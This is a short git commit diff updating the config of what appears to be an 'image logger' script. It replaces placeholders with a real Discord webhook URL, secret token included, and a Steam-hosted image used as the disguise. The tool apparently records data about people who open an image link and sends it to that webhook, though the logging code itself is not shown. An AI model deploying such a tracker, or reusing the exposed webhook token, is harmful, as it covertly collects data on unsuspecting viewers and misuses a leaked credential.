04f1933417a9f8ae2b10ca95e09a9947df6eba07
Kawa-ux <kawatemplates@gmail.com>
2025-03-24 15:42:17 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,8 +13,8 @@
  
  config = {
      # BASE CONFIG #
-     "webhook": "https://discord.com/api/webhooks/your/webhook",
-     "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+     "webhook": "https://discord.com/api/webhooks/1353739896996499508/Qv_8Zwtbbmw2JRmNkkI58ofHbDHX578Gt2OmnolJnfWntbyBJ3pry-UFKBJUHU7AC5zi",
+     "image": "https://images.steamusercontent.com/ugc/2276071244497320770/071AFFF34997C34057372AF98A310CA63AB6BC09/?imw=637&imh=358&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true", # You can also have a custom image by using a URL argument
                                                 # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
      "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
  
